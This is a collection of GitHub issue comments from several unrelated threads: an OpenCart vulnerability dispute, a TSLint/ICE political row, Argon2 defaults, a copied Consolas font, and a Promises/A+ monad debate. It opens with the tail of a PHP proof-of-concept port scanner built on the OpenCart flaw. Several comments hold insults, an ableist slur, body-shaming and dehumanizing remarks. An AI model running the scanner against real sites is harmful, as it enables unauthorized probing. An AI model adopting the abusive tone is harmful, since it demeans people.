    $packet .= ""Cookie: PHPSESSID={$sid}\r\n"";
    $packet .= ""Connection: close\r\n\r\n"";

    if (preg_match('/500 Internal Server Error/', http_send($host, $packet))) print ""[+] Port {$port} is opened\n"";
    else print ""[-] Port {$port} is closed\n"";
}
```

Do you still believe this vulnerability is bullshit?!
"
5028	"@EgiX

Please feel free to post any other issues you find in the OpenCart Community Edition github repo.  You can also PM me in the forum under username ""rph"".
"
5029	"opencarthelp, i suggest you stop hijacking my threads!

EgiX, yes you are right constructor is not called! I thought it was. your vulnerability is still next to useless for any attacker!

I asked you 3 times for information which you refused to send me and instead just wasted my time! so congrats your banned!
"
5030	"@danielkerr original comment:

<i>opencarthelp, i suggest you stop hijacking my threads! EgiX, yes you are right constructor is not called! I thought it was. anyway I don't like people being able to launch code they are not supposed to from out side of the store even if the vulnerability is low so i will change use json_encode instead.</i>

You're still continuing to claim that the vulnerability doesn't exist, unbelievable!
Can you then explain why you decided to fix it?

https://github.com/opencart/opencart/commit/8dcd3689febf34d6190d76003b69ef8d04da87f1#diff-a624b79700f156e638d6bb5ae87b59dc
"
5031	"what i said is:

""vulnerability is still next to useless for any attacker!""

all the messing around sending pms on the forum for this! 
"
5032	"also removed the code i was testing with. validating the cart key is better.
"
5033	"http://forum.opencart.com/viewtopic.php?f=10&t=129076 
golfclap.gif
"
5034	"""I wonder why I've never used OpenCart"" ... ""oh right it's lead developer is retarded.""

Nice find @EgiX, lol and thanks for the laugh :)
"
5035	"@scottstamp -

While I don't agree with @danielkerr's response on this issue (or many others) - you're behaving in the same manner as @danielkerr  by calling him derogatory names... essentially you look as foolish as @danielkerr. 
"
5036	"@DS-Matt I disagree. While the word ""retarded"" used in this context is ableist, his criticisms of Mr. Kerr's attitude are on-point and proportionate. He's not thumbing his nose at security researchers trying to improve his project. ""As foolish as @danielkerr"" therefore is incorrect.
"
5037	"@sarciszewski - I'm sorry, we will have to disagree on this one.  While it's foolish to disregard a reported security threat, in my opinion the most foolish aspect of @danielkerr's handling of this issue (along with many other issues reported on Github) is his negative response (to insult and calling people derogatory names only hurts the Opencart Project's reputation)... Which is the exact same behavior @scottstamp did with his post today (it's worth noting that @scottstamp's actions were unsolicited and contributes nothing to any useful discussion), basically hurting his reputation for no benefit (unless he gets satisfaction from insulting others, which would be quite a sad reflection of his character than)...  In my opinion behaving in a manor that is detrimental with no benefit seems very foolish!   
"
5038	"@sarciszewski get this right. this is more of a minor bug than a vulnerability. this issue does not compromise the users site nor expose any information.

I asked @EgiX 3 times for the info and he refused to send it to me. nothing has been ignored, @EgiX has over exaggerated the issue. nothing needs to be done except add a fix in the next release. 
"
5039	"@sarciszewski also your post in my forum has been deleted using the 1 click ban button for spam because you have 9 other posts about the same topic within 1 hour ! 

@DS-Matt these people are not part of the opencart community @sarciszewski only signed up to make 9 spam posts about this issue in the forum. does that sound like some one normal to you?

@scottstamp you need to grow a brain and lose some weight!

https://avatars3.githubusercontent.com/u/1681929?v=2&s=400

Go on a diet!
"
5040	"EgiX posted this:

http://seclists.org/bugtraq/2014/Jul/64

he completely forgets to mention that all opencart request vars run through a filter making all html is encoded into html entities! same goes for xml! so he gets to post a Vulnerability that does not even work!

he did 0 testing! this guy is a clown!
"
5041	https://news.vice.com/en_us/article/paw9ky/toddler-died-after-getting-sick-in-ice-custody
5042	https://twitter.com/ACLU/status/1033084026893070338
5043	How's it feel to contribute to this institution?
5044	See https://github.com/palantir/tslint/issues/4132 .
5045	They're human garbage, I asked nicely, now I'm going to force them.
5046	"To anyone looking for an alternative to TSLint:
After leaving TSLint I startet developing my own linter, the [Fimbullinter project](https://github.com/fimbullinter/wotan). For a quick start guide, see [the documentation of Wotan, the linter runtime](https://github.com/fimbullinter/wotan/blob/master/packages/wotan/README.md)
There's a plugin to make Fimbullinter a drop-in replacement of TSLint: [Valtýr](https://github.com/fimbullinter/wotan/blob/master/packages/valtyr/README.md)
Another plugin allows you to use your existing (custom) TSLint rules while benefitting from all other features of the linter: [Heimdall](https://github.com/fimbullinter/wotan/blob/master/packages/heimdall/README.md)
Also note that it has [many builtin rules](https://github.com/fimbullinter/wotan/blob/master/packages/mimir/README.md#rules) that are either not available in TSLint or superior to their TSLint counterpart."
5047	">I asked nicely, now I'm going to force them.

@jamiebuilds Everyone already knows that you asking ""nicely"" is just a pretense before you call in the mob, but nice of you to admit it. The mafia asked nicely too if business owners wanted insurance.

Garbage is as garbage does."
5048	"https://opensource.org/faq#commercial

**Can I stop ""evil people"" from using my program?**
> No. The Open Source Definition specifies that Open Source licenses may not discriminate against persons or groups. Giving everyone freedom means giving evil people freedom, too."
5049	"I actively support the notion of denying resources, a platform, and freedom, to evil people. I don't care if this isn't ""true"" freedom. Those people don't deserve freedom. Hell, I'd even go so far as to say they don't deserve to share this world with us."
5050	Are the police evil too?
5051	Typical leftist bullying
5052	"@kode54 

I actively support the notion of denying resources, a platform, and freedom, to **furries**. I don't care if this isn't ""true"" freedom. Those people don't deserve freedom. Hell, I'd even go so far as to say they don't deserve to share this world with us."
5053	"And they can also be as unclear as they like. Anyone who thinks the US government is evil can go live under a rock on a island somewhere and avoid contact with anything that was produced as a result of the US government. Alternatively, they can try doing research outside of the bubble of propaganda they apparently consume.

Enough with the brownshirt tactics."
5054	The current administration and the entire cabinet put in place by it are certainly evil, or at least maliciously stupid. I also delight in your painting leftism as if it is a bad thing. I’ll just ignore that other comment.
5055	Without getting into that, the law ICE are implementing well predates the current administration
5056	https://news.vice.com/en_us/article/paw9ky/toddler-died-after-getting-sick-in-ice-custody
5057	https://twitter.com/ACLU/status/1033084026893070338
5058	See https://github.com/palantir/tslint/issues/4132 .
5059	"The paper actually states that if t_cost>10 then the tradeoff attacks bring no advantage to the attacker, whereas for t_cost<10 some advantage can be theoretically gained.

This does not mean that t_cost should be set to 10 or more, because the increase in t_cost already brings advantage to the attacker, and it is much higher that he would get from tradeoffs."
5060	">Should run.c be patched to 10?

That starts to run for multiple seconds on some machines. That wouldn't be feasible without a very low m, which should be a much bigger vulnerability."
5061	10 iterations run multiple seconds on some machines? **1000 iterations** with 2 threads and 1 MB memory **are hardly 0.5 seconds** on my machine and my machine is a 5 year old notebook that wasn't even a top model at the day of purchase. So what machines are you referring to? Mobile phones produced before the year 2010? These would probably not be able to execute `run.c` as allocating 4 MB of RAM isn't going to succeed.
5062	"1 MB is not much memory though. It runs for multiple seconds (or potentially much longer) when you're using a lot of RAM. For example, Argon2d with 2 threads, 10 iterations, and 2048 MB takes ~12 seconds on my X250 Thinkpad. With only 1 iteration, it takes around 2.5 seconds. Argon2i would be similar. 

For local key derivation, 2-4 seconds is probably acceptable, but 12 is really pushing it. 
"
5063	"But the default of `run.c` is just 4 MB memory, not 2048 MB, and with that the default of 3 iterations is nothing. That takes **7.5 ms** on my machine. 

You can always configure all parameters as you like, they are all available as arguments, make them as high or as low as you like, as secure or as insecure as you like, as many rounds as you like, as much memory as you like. IMHO this issue is just about the default parameters (3 rounds is just the default, not the upper bound) and the default parameters are *Argon2i, 3 rounds, 4 MB RAM, 1 thread* and this combination is not secure; period. If you know that anything `<= 10` iterations isn't secure, then how meaningful is it to choose default settings with less than 10 rounds? Why would you like ""insecure"" default settings? Nobody profits from insecure default settings. Make default settings secure and let users lower security if these safe settings are too expensive for them (that will then be their own responsibility).

So if we make 16 rounds default, we have *Argon2i, 16 rounds, 4 MB, 1 thread* and this takes **38 ms** on my machine (BTW Argon2d only 32 ms, it's even faster).

**technion** claimed that more than 10 rounds will
> start[s] to run for multiple seconds on some machines.

Okay. Let's take a shortcut in this discussion: Please show me a machine where *Argon2i, 16 rounds, 4 MB, 1 thread*  runs multiple seconds. Easy request, should be easy to fulfill if that statement is really true. If you cannot find such a machine, this whole discussion is void and there is no legit reasoning for now increasing the default numbers of rounds to more than 10."
5064	"@CodingMarkus  At that memory and thread use, it doesn't.

We could bikeshed sensible defaults for hours, but I don't see why you're making an issue of this. This is a patched issue.

We're not really even talking about defaults ""as typically used"" because run.c is just an example of using the library, no one us making system() calls to ./argon2 to generate a hash. "
5065	"@technion I didn't make an issue out of this, you made an issue out of this by publishing a false claim that you cannot patch `run.c` to more than 10 rounds as that wound run multiple seconds on some machines. First of all the claim itself is wrong (you just admitted it to be wrong), second  you admit yourself that it wouldn't even matter (even if the claim was correct) as nobody is calling the command line tool in the first place and patching `run.c` has absolutely not influence on the library or how existing code would use it. So your argument against patching `run.c` is... correct, non-existent, you have no argument. So next time at least be so honest and say ""*Yeah, we could do that... but we don't want to. Not that there was any reason, we just don't want to*"" as that would at least have been the truth and an honest answer to bryant's concerns."
5066	"
@khovratovich  Could you please lock this issue. I have intent in responding to aggression."
5067	Break.
5068	"The metadata of the .sfd files says ""(c) 2018 Microsoft Corporation. All rights reserved."" I'm pretty sure that PiotrGrochowski has no affiliation with or permission from Microsoft, and the font has not actually been made FOSS."
5069	"> 
> 
> Tag says public-domain, but there's no license file or mention of license in the readme.

If there was a licence, this would be proprietary and copyrighted. Obviously not a very good idea for a font that's to be widely seen. All small files (such as retro games or the Consolas font) are virtually public domain as they are redistributed quicker than they can be taken down. Therefore it's safer to make such files officially public domain. Also, ttf files are open source because they are the source."
5070	"@PiotrGrochowski i dont think you understand how open source works.

just because you found the SFD files and illegally distributed them doesnt make this open source, it just makes you a criminal.

microsoft, the actual copyright owner, needs to corroborate what you are saying. otherwise this repository is nothing more than proof that you have violated the Digital Millennium Copyright Act, a federal crime in the united states.

notes that i have reported you for copyright violation and for distributing malware to the admins. Note that even if we have a huge case of Hanlon's razor here, i would still recommend deleting this repo."
5071	I used the ttf files from my PC (which are public domain, like any other small file) and generated it in the sfd and ttf formats for the updates. That's not a copyright violation.
5072	"The fact that the file is small does not make it public domain. Every creative work is copyrighted so long as it exceeds the [threshold of originality](https://en.wikipedia.org/wiki/Threshold_of_originality), which an entire font definitely does.

Perhaps you're thinking of the [de minimis](https://en.wikipedia.org/wiki/De_minimis) doctrine, which is the practice that using a very small portion of a copyrighted work in a much larger work is not considered infringement (e.g. if you took a photo of a crowd, and someone in the crowd had a copyrighted design on their t-shirt, your photo wouldn't be considered an infringing work). You've used the entire font and your new versions of the font use most of the original font, so de minimis would definitely not apply. "
5073	The thing is, small files like retro games or font files are redistributed quicker than they can ever be taken down!
5074	"Sure, and sometimes I drive 5 mph over the speed limit. Doesn't make it legal. The font is not ""open source"", at least not in the sense that people typically use that term (i.e. as shorthand for ""free and open source software (FOSS)""). If you want to distribute your own version of the font then that's your prerogative. Microsoft will probably never care enough to do anything about it, but don't act like you have permission or the font has been made open source. "
5075	"Per [Wikipedia](https://en.m.wikipedia.org/wiki/Copyright_infringement):

> Copyright infringement (colloquially referred to as piracy) is the use of works protected by copyright law without permission, infringing certain exclusive rights granted to the copyright holder, such as the right to reproduce, distribute, display or perform the protected work, or to make derivative works.

Unless you are the copyright holder (sole originator) of all files, or you’ve received explicit permission from all copyright holders, you’ve probably violated at least 2 of those exclusive rights by hosting the font yourself, and another by distributing a modified version. 

Having no license doesn’t mean it’s public domain. Being on everyone’s computer doesn’t make it public domain. The only thing that makes something public domain is having it be older than the length of copyright protection by law, which is life of original authors + 70* years (depending on type of content).

Everything else needs a license if you want to grant more permissions than granted by copyright law. "
5076	Let's just say this repository is in _informal_ English. You know, that one that everyone on Earth uses.
5077	"What is this repository being ""informal English"" gonna do? Look, it's pretty clear: you just put Consolas through a converter, ripped its chars and are putting it on GitHub as if you hold the rights. Fun fact: you don't. Consolas isn't an open source font and putting it on GitHub without a license doesn't make it open source (heck, anything of which you can view the code that does not carry a license is not open source), not to mention that you just published ttf files, not actual source files. You clearly don't understand how this works."
5078	TTF files ARE the source. Not to mention, I spent hard work adding missing characters with FontForge.
5079	"Yes, I really would like monadic promises as well…

Only I fear that won't happen. I already objected in #75 on the recursive assimilation process, but as it stands the `then` method is overloaded with `join` as well :-(

And that `point` function is subject of the (independent) [resolvers-spec](https://github.com/promises-aplus/resolvers-spec). As Brian already wrote, it would be sufficient in most cases to construct a simple thenable, instead of using some implementation-dependent Promise constructor.
"
5080	"Yeah this is really not happening. It totally ignores reality in favor of typed-language fantasy land, making a more awkward and less useful API just to satisfy some peoples' aesthetic preferences that aren't even applicable to JavaScript. It [misses the point of promises](http://domenic.me/2012/10/14/youre-missing-the-point-of-promises/) (modeling synchronous control flow from imperative languages), albeit in a novel way from the usual misunderstandings.

It is also hilariously inaccurate, as the thenable described comes nowhere near satisfying the spec. My guess is that it would pass approximately one of the ~500 tests in our test suite.

Someone more diplomatic than me should probably chime in too.
"
5081	"@paulmillr, @bergus: I fully understand and appreciate this perspective, and similar ideas have been discussed at various lengths by the Promises/A+ contributors.

As @domenic has rightly pointed out, though, it isn't practical for Promises/A+ to go in the direction Brian Mckenna is proposing.
"
5082	"@domenic you miss the point of monads. They implement exactly what you're describing in the post. They create sequential, synchronous control flow. That's why they're used in Haskell as IO! That's why promises are monadic!

Please point out where I'm missing the point of promises.

I'm basing the API off of category theory but it's for my aesthetic preferences!? When you say the API is ""more awkward and less useful"", that's reflecting _your aesthetic preferences_. Mine haven't even come into it!

I'm going to work on a separate specification - I'm hoping the rest of the JavaScript community will embrace it, rather than immediately reject it because it was based off of types.
"
5083	"> I'm going to work on a separate specification

@pufuwozu terrible idea. The reason why A+ isn't separating `map` and `bind` isn't because of aesthetic preferences. We didn't even discuss the issue because it's a breaking change and it came way too late into the discussion. `then` became a de facto standard that even the DOM is now likely to follow with [DOMFuture](https://github.com/slightlyoff/DOMFuture).
"
5084	"@juandopazo I don't really care about having `bind` fall back to `map` when it doesn't return a promise. I'd prefer it to throw an exception but I'll just be careful.

What I do care about is a specified way to create promises and `onRejected` to be separate from `then`. That's all.
"
5085	"A specified way to create promises is coming, it's just not here yet.  see https://github.com/promises-aplus/resolvers-spec, which is nearly ready for a version 0.
"
5086	"Separating `.then` and `.onRejected` was not done for very good reasons:
1. It allows for the parallel control flow of: Do Operation A, If operation A succeeded, do B, if operation A failed, do C.  Separation makes that very hard to write.
2. Keeping the API surface that needed to be implemented for interoperability to a minimum is critical to the success of promises.  There are are many promises out there that don't come close to implementing this spec, but are still good enough for full interoperability because they have a `.then` method that takes two arguments: `onFulfilled` and `onRejected`.
"
5087	"> What I do care about is a specified way to create promises and onRejected to be separate from then. That's all.

@pufuwozu In that case, I would suggest you should join the discussion for [creating promises](https://github.com/promises-aplus/resolvers-spec) rather than go out on your own.  You could also propose a discussion to this group for an _optional_ `onRejected` API (several promise implementations provide this already: when.js's `promise.otherwise`, Q's `promise.catch`, other libs provide `promise.fail`, etc.).

However, changing `then` simply is not an option.
"
5088	"While it might be nice for some people to have a specified way of creating promises, it's certainly unnecessary. Different platforms will have different ways of creating them. This is already the case. For instance, see the [WinJS promises](http://msdn.microsoft.com/en-us/library/windows/apps/br211867.aspx) vs [DOMFuture](http://dom.spec.whatwg.org/#futures). The point of having a spec is compatibility between them. And in that spirit, having a smaller API surface is better.

Creating a new specification just to add `onRejected` sounds a bit overkill.
"
5089	"Finally, the reason we didn't separate out `bind` and `map` is simply that it's not pragmatic to do so.  It fits very nice with a theoretical computer science model of the world, but not with practical usage of the libraries.  JavaScript is characterized by pragmatism over theory, and is ultimately devoid of type safety as a result.  Without the benefits of type safety, separating out bind and map doesn't gain you anything.

It's not the aesthetics that @domenic or me or @briancavalier or anyone else like that matter; it's the aesthetics of the language itself.  JavaScript's concept of a promise is subtly different to (although closely related to) the idea of a monad.  It's the result of people attempting to use the ideas of a monad in real world applications, not the result of ignoring past work and coming up with something new from scratch.
"
5090	"@ForbesLindesay I don't care very much about the separation of `bind` and `map`. As long as it's _at least_ bind then I'll just be careful with the other behaviour.

> ... ideas of a monad in real world applications...

That's exactly what I want. Let's not implement partial monads that we can't abstract over. Let's recognise it for what it is and allow functions which work for _ALL_ monads. Why not allow DRY code instead of some strange idea of _aesthetics of JavaScript_?

It might be too late but I'd rather a specification which allows DRY code with very partial backwards compatibility. I do not accept _aesthetics of JavaScript_ as an excuse for developers to write more libraries that we can't abstract over.
"
5091	"We can abstract over them.  There are hundreds of JavaScript libraries that use the promises and next to none that use traditional monad APIs.

You completely (deliberately?) missed the point of what I was saying about monads in real world applications.  I'm saying people took the ideas of monads and used them in real world applications and adapted them to fit well with how JavaScript works.  They are not, nor are they designed to be, interoperable with monads from Haskell.  If you're creating a bridge for interop between the two languages, you could always automate that conversion.

They are very demonstrably DRY and possible to abstract over.  If anything the `.then` method allows for more DRY code because you don't have to special case for whether the result is a promise or a non-promise value.  Functions like `Q.all` demonstrate that they are a sufficiently powerful abstraction.

This is beginning to look like trolling, and if it continues to look like trolling, I will just be muting this thread.  Without any interest int he aesthetics of JavaScript, I don't see your competing spec as anything likely to cause a problem.
"
5092	"I don't see how you can't abstract over promises. You showed exactly how in your post. If we followed the DOMFuture API, it would look like this:

``` JavaScript
// the DOMFuture way of defining point()
function point(value) {
  return new Future(function (resolver) {
    resolver.accept(value);
  });
}
// Adding onRejected
Future.prototype.onRejected = function (f) {
  return this.then(null, f);
};

// flatMap is exactly the same if you don't want to separate bind and map
function flatMap(p, f) {
    return p.then(f);
}
```

Starting a standards war over this sounds like a great way to use our time.
"
5093	"People misunderstood what I meant by ""abstract over"" - of course we can build libraries on top of the promises specification :)

I want to _abstract over all monads_. That's a very important thing for DRY code. I should be able to write code like this for example:

```
function liftA2(pa, pb, f) {
    return ap(pb, map(pa, function(a) {
        return function(b) {
            return f(a, b);
        };
    }));
}

// Promises (called when both succeed)
liftA2(readFIle('hello.txt'), readFile('world.txt'), function(hello, world) {
    console.log(hello + ' ' + world);
});

// Optional values (only inserted into database when both exist)
liftA2(optionalUsername, optionalPassword, function(username, password) {
    insertIntoTable(""user"", {username: username, password: password});
});

// Arrays (function called for each element of each array)
liftA2([1, 2, 3], [4, 5, 6], function(a, b) {
    console.log(a + b);
});
```

All I need to make the above work is for optional values and arrays to have a `then` and each constructor to have a `point` function. I don't have to write that function for each different monad - I only have to write it once. That's just one example of a function that works for any monad - there's many, many more.

I do care about the aesthetics for the API. I don't not accept _aesthetics of JavaScript_ as an excuse to not allow me to do the above.

I care very much about generalised, DRY code. It's the right thing to do, even in JavaScript.
"
5094	"> It allows for the parallel control flow of: Do Operation A, If operation A succeeded, do B, if operation A failed, do C. Separation makes that very hard to write.

It's not just hard, it's impossible to get the same semantics. Promise has to be a bifunctor (i.e. has a bimap that takes two functions) for this to work at all. There are other bifunctors out there, such as [`Either`](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-Either.html#v:either), with `either` as its bimap.

@pufuwozu: I think the reason you're getting so much pushback on this, is that we create Promise APIs to make it easier for developers to write and manage asynchronous code. From my own experimentation in this area, you can only take the formalization so far in Javascript before the language starts to push back. The fmap/bind divide is one of those places; it's just much easier to use the library if you combine the two together.

You recall, perhaps, how electromagnetism and the weak force are actually part of the same mechanism, but only at very high temperatures? Well, we simply can't turn up the furnace that high in Javascript. Certain formalisms work beautifully in Haskell but fall flat in Javascript without support from the language. Haskell's static typing lets you offload a ton of work onto the compiler, but Javascript doesn't help much at all!

Prime example: in my own sandbox I've attempted to split Promise into two parts: a Result wrapping of try-catch, and a Future for deferred return values. It's theoretically nice until you realize one thing: monads don't naïvely compose. I don't know _how_ the heck you would write monad transformers in Javascript. :grinning:
"
5095	"@Twisol JavaScript is limited but we can still achieve DRY code by applying category theory. I do it: http://bilby.brianmckenna.org/ - the ""but real world"" excuse doesn't apply; I've used that library in a _compiler_!

Different monads don't compose but monad transformers are easy to implement in JS when you get to them ;)
"
5096	"@pufuwozu can you show with a concrete example why you can't write the example code you posted with promises?
"
5097	"Your example of code that would be difficult to write with promises as they currently stand would in fact be easy to write for promises.  I'm not 100% sure of the behavior of `ap` and `map` since you haven't included source code for them, but those two functions would (obviously) be different for promises vs. traditional monads.  Since there are vastly more libraries using promises than monads, it is the monads that are preventing you from writing DRY code.

If you provide JavaScript source for `ap` and `map` using monads, I will write the corresponding functions for promises.  Otherwise, stop trolling.
"
5098	"+1 to not starting a standards war. Any correct model of promises can be wrapped into a monadic interface, and it is pretty normal for standards to be a little off and require wrapping with a library.

Also, our understanding will improve over time, and it would be a disaster to have to move as slow as standards processes and have to wait for social trends to fall in line with mathematical truths. For example, before 2008 @pufuwozu would probably not have known to mention applicative functors.

-1 to the theory-phobia and accusations of trolling. Whether you like it or not, promises form a monad, and @pufuwozu is advocating that the standard expose this very useful structure. I understand why it will not, and agree somewhat with the decision, but that does not reduce the validity of the criticism.
"
5099	"@ForbesLindesay you should take a look at my blog post:

```
function map(p, f) {
    return flatMap(p, function(a) {
        return point(f(a));
    });
}

function ap(p, pf) {
    return flatMap(pf, function(f) {
        return map(p, f);
    });
}
```

So we need a both a `point` and `flatMap` which works for Arrays, optional values, promises and _anything else monadic_. Then we can derive lots of useful DRY functions, like the `liftA2` function that I posted above.

There will be no specified way to do this. That's what my blog post should have shown.

Thanks @kennknowles.
"
5100	"Leaving aside the issue of the spec and whether or not we should change it (my opinion: we shouldn't), I'd be interested in seeing a pure approach to Promises. Something doesn't have to conform to a spec to be useful, and _if_ it turned out that we're all wrong - that you _can_ write pure code without it being brittle in the face of dynamic typing - then there's no reason inspiration couldn't be taken from the approach.

I don't want to see a standards war or any division of effort; just understand that there are reason that the spec is the way it is, and we need more than an impassioned plea for purity to make changes.
"
5101	"To clarify:

I'm not anti type theory per say.  I actually find it extremely interesting.  I've written a fair bit of code in languages like ML and F# that do a decent job of strong typing systems.  I also think it would be an interesting experiment to attempt to create a strongly typed subset of JavaScript.

This is not the place for such experiments though, and my accusations of trolling are not directed at @paulmillr who made the very reasonable comment that we should consider category theory and monads more extensively.  My accusation of trolling was leveled at @pufuwozu because he repeatedly tells us that the promises spec as it stands is insufficient for writing certain functions in a DRY way, yet refuses to demonstrate any actual problem.
"
5102	"@ForbesLindesay I demonstrated the problem in my blog post. There is absolutely no refusal. It's an easily demonstrable problem.
"
5103	"I don't think there's any need to fear a ""standards war."" @pufuwozu can do his own thing, and I'm sure he'll have fun doing so, but I imagine the proportion of people using ""monadises"" versus Promises/A+ will be roughly equal to the proportion using Roy over ECMAScript.
"
5104	"The point function in your blog post is still fantastically broken.
"
5105	"The problem is really simple.

Let's take three monads. Maybe, Promise and Array. I think we can all agree they support a `point` operation that takes a value and returns a monad and support a `flatMap` operation.

Now if I wanted to write a _SINGLE_ polymorphic function that took two monads and did an operation on them. It would need a mechanism to look at my arguments and extract both a `point` and `flatMap` operation in a standardized way.

This isn't about writing DRY and composable functions with promises. It's about doing it with monads and accepting that a promise is one of hundreds of data types and tools in our toolbox. Sure we can just drink the promise coolaid and do everything with promises but that defeats the point of composability. Composability is trivial in a dictatorship.

@pufuwozu a reasonable suggestion is to write a `flatMap` and `point` function which just has a massive switch in the body that handles all real monads and all toy monads.
"
5106	"@domenic that's fine. I usually hang out with the people that ""do the right thing"" - though, I actually thought my blog post would be taken seriously and appreciated.

@ForbesLindesay yeah, it's not easy to write a minimal implementation. Will I see a real one when you've managed implement the above?

@Raynos a switch would make the assumption that the world is closed and we could never write a new monad or use a new library. I would much prefer:
- Promise.point = function() { /\* ... */ };
- Promise.prototype.constructor = Promise;

Which would allow us to approximate `point` for most functions.
"
5107	"Yep, the problem @pufuwozu is having is just that promises don't interoperate with monads.  We already have a function that's broadly equivallent to how your blog post describes `liftA2`.  We normally call it `all` and it takes promises, values, or arrays of promises/values in any combination and returns a promise for an array.  You can see it implemented [here](https://github.com/then/all/blob/master/index.js#L19-L38).

To build ""liftA2"" on top of that:

``` javascript
function liftA2(arg, fn) {
  return all(arg).then(function (res) {
    return res.map(fn);
  });
}
```

[Here](https://github.com/then/promise/blob/master/index.js#L9-L128) is a minimal promise implementation.  Most of the additional code is to handle the guarantees of asynchronous behaviour and polymorphism on return types.

As for the criticism of switches, you don't switch on library, you switch on type of object: e.g. promise, monad, array...
"
5108	"As for your desire to have something like `Promise.point`, it is being considered for the Resolvers Spec in https://github.com/promises-aplus/resolvers-spec/issues/5
"
5109	"_facepalm_

You folks **really** need to learn to communicate this issue in terms that anyone can understand. And I mean anyone who doesn't know category theory or how Haskell works.

PS: here's the working code of the original post: http://jsbin.com/iroxeg/1/
"
5110	"@ForbesLindesay that only works with promises. I have to write that function for _every_ different monad. That is not DRY!

You can't switch on everything in the whole world! If I write a library that uses a `point` which switches on each type in each library it uses, I can't add another. I have to reimplement each of those functions. That is not DRY!
"
5111	"@juandopazo now make it work for Arrays, optional values, promises and a _to be decided_ structure (I have one up my sleeve).

That is what I want from the specification. I'm not sure how this message is being missed. How can I make it clearer?
"
5112	"@pufuwozu: don't worry, there are lurkers here who certainly get the point, agree with you, and don't contribute because it couldn't possibly be made any clearer :wink:.

You're not going to get through to people in this manner if it hasn't yet happened.
"
5113	"@pufuwozu write a monads module. test for flatmap and point. then whitelist all the uncompliant monads. if someone writes a new uncompliant monads, update the module, put it in the whitelist. bump the patch version and republish.

also thank you. I finally understand the point of monads. however polymorphism in JavaScript is a lost cause.
"
5114	"> How can I make it clearer?

You can make it clearer by showing concrete examples of things that break, can't be done or would be much easier some other way. With code. 

For instance, nowhere in your post does it say exactly what you expect `point` to do. Only after reading @Raynos' comment I got the idea that it's not just a wrapper for creating a promise for a certain value, but that maybe you expect it to have a different {{class}} depending on the value you want to wrap.

You want to add value to the a standard we have agreed on, I'd say the burden of explaining how it's supposed to work for ""Arrays, optional values, promises and a to be decided structure"" is on you.

> You're not going to get through to people like this if it hasn't yet happened

I'm sincerely offended. I am trying to get something of value here and so far I haven't. Both this attitude and the troll accusations aren't helping.
"
5115	"@juandopazo: I changed ""like this"" to ""in this manner"" because it was ambiguous and I feared people may have taken it like that. Unfortunately, you did. I did not intend to call you and others ""people like this"".
"
5116	"@juandopazo: I just call it `construct`, as in a constructor, since it's more obvious what it's trying to do. It isn't standard nomenclature, but whatever. :grinning:

> You want to add value to the a standard we have agreed on, I'd say the burden of explaining how it's supposed to work for ""Arrays, optional values, promises and a to be decided structure"" is on you.

I agree. I think there's value to be had, but Promises/A+ is at best a single kind of monad. If you want broad application of monads, there needs to be a separate discussion and exploration on what the best way to do it is. @pufuwozu's bilby library shows one possible way (and it's certainly very interesting!), but I'm not convinced that it's the only way, nor the simplest.
"
5117	"@juandopazo 

> The above will work for any monad. List of lists? Optional optional value? If the JavaScript community settled on using flatMap as a method, we could write DRY, generalised code for monads.

He does state in the blog article that it's about polymorphism across all the monads, not just promises. Is there something here that's not obvious?
"
5118	"I'm not sure which parts aren't clear so here we go. A 3 function unspecification of Promises/M(onadic):
- A promise must provide a `then` function. It takes a function which itself will return a promise. The `then` function returns a promise and schedules the given function. When the given function is resolved, it should sync state with the promise returned by `then`.
- A promise must provide a `constructor` which has a `point` method. The `point` method will create a new promise, containing the given value.
- A promise must provide a `onReject` function which will handle rejections for the next `then` call.

Done. The second and third part are my additions. Now it's become a superset of ""the monad specification"". What does that let me do? This:

```
function map(p, f) {
    return p.then(function(a) {
        return p.constructor.point(f(a));
    });
}

function ap(p, pf) {
    return pf.then(function(f) {
        return map(p, f);
    });
}

function liftA2(pa, pb, f) {
    return ap(pb, map(pa, function(a) {
        return function(b) {
            return f(a, b);
        };
    }));
}
```

Now I can add a `then` and `point` to `Array.prototype` and `Array`, respectively. Or I could write a wrapper around Array, if I don't want to mutate the constructor or prototype. I can also do that to my optional value wrapper. Or any other monad that I want. I can also do it _after_ I've defined the above function.

```
// Promises (called when both succeed)
liftA2(readFIle('hello.txt'), readFile('world.txt'), function(hello, world) {
    console.log(hello + ' ' + world);
});

// Optional values (only inserted into database when both exist)
liftA2(optionalUsername, optionalPassword, function(username, password) {
    insertIntoTable(""user"", {username: username, password: password});
});

// Arrays (function called for each element of each array)
liftA2([1, 2, 3], [4, 5, 6], function(a, b) {
    console.log(a + b);
});
```

So: I just want two specified functions which make it a monad. That is all. I promise :smiley: 

Does the above make it any clearer?
"
5119	"> A promise must provide a onReject function which will handle rejections for the next then call.

This is asymmetric solely for the purposes of getting rid of a combination method. You can achieve the same power by specifying a single `branch` primitive that takes both callbacks, and implementing `then` and `onReject` from it.

It also seems like you're neglecting the failure path (i.e. functions chained on through onReject). We really want analogous versions of liftA2, ap, and map for both sides.
"
5120	"@Twisol monads do somewhat gloss over the failure path. Failure path methods are provided separately. Which path is that monadic path does come down to aesthetics - which one is your ""main"" path? If failures are your ""main"" path then you will need to write a wrapper to flip it. Bad luck for that 0.000001% of cases?
"
5121	"Hang on, I apologize if this is a stupid question, but...do people really prefer the overloaded `then` for _aesthetic_ reasons?

I'm scratching my head trying to figure out why we want a method whose purpose in life is to take two other functions and then call one of them. Isn't that just an unnecessarily convoluted way to implement two methods? I'm pretty sure if I came across that in my code, my first instinct would be to refactor it into two methods.

Can someone explain this to me?
"
5122	"> He does state in the blog article that it's about polymorphism across all the monads, not just promises. Is there something here that's not obvious?

Maybe it's that I just caught a cold and I'm a bit slow. Sorry if that's the case.

> Does the above make it any clearer?

Yes, a lot. Thank you.

Ok, I see two issues then. The first one is how to create monads/promises of the same type of another one. That's a fair question to ask and it's something we have already discussed to an extent. It is something we're approaching with the `new Promise(fn)` signature. This ensures that `new Promise(fn) instanceof Promise` and helps with creating flavors of promises. For instance an Array promise would look like this:

``` JavaScript
function ArrayPromise() {
  Promise.apply(this, arguments);
}
ArrayPromise.prototype = Object.create(Promise.prototype);
ArrayPromise.prototype.constructor = ArrayPromise;

ArrayPromise.prototype.filter = function (fn, thisp) {
  return this.then(function (array) {
    return array.filter(fn, thisp);
  });
};
```

Getting a new promise from another one is just a matter of doing `new promise.constructor(fn)`. Following that idea, I think `point` was discussed with the name `Promise.from`. I think you make a good point for why it may be important to standardize how to construct promises. Unfortunately, as I mentioned before, we already have dissimilar implementations (see WinJS and DOMFuture), so it'll be a challenge.

